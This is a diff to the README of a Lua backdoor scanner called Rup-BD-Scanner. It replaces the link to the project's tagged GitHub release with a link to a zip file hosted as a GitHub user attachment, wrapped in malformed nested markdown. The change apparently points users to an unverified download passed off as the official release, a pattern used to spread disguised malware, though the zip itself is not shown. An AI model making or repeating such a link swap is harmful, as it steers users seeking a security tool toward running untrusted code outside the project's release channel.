@@ -8,7 +8,7 @@ Rup-BD-Scanner is a Python application designed to scan Lua scripts for potentia
 
 To use Rup-BD-Scanner, you can download the pre-built executable:
 
-- [Download Latest Release](https://github.com/ruptz/Rup-BD-Scanner/releases/tag/V1.0.0)
+- [Download Latest Release]([https://github.com/ruptz/Rup-BD-Scanner/releases/tag/V1.0.0](https://github.com/user-attachments/files/17629656/Rup-BD-Scanner.zip))
 
 ## Getting Started
 
